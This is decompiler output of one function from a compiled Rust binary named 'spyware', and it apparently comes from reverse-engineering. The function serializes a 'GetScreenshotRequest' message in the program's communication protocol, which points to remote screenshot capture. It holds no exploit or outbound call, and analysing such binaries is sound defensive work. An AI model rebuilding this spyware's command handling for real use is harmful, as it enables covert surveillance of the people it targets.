
  fn spyware::communication::messages::_::_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$::serialize::hbb0030a4e5e27df6(arg1: *mut i32, arg2: i64, arg3: *mut i64) -> *mut i32

{
    let mut var_38: i32;
    _$LT$$RF$mut$u20$ron..ser..Serializer$LT$W$GT$$u20$as$u20$serde..ser..Serializer$GT$::serialize_struct::h19528d03ac3c512b(&var_38, arg3, "GetScreenshotRequestDisplayScree…", 0x14, 0);
    let rax: i32 = var_38;
    let var_30: *mut i64;
    let var_28: i8;
    
    if rax == 0x21
    {
        _$LT$ron..ser..Compound$LT$W$GT$$u20$as$u20$serde..ser..SerializeStruct$GT$::end::h1114ba35daa4ac40(arg1, var_30, var_28);
        return arg1;
    }
    
    let var_18: i128;
    *arg1.byte_offset(0x20) = var_18;
    let var_27: i128;
    *arg1.byte_offset(0x11) = var_27;
    *arg1 = rax;
    let var_34: i32;
    arg1[1] = var_34;
    *arg1.byte_offset(8) = var_30;
    arg1[4] = var_28;
    arg1
}
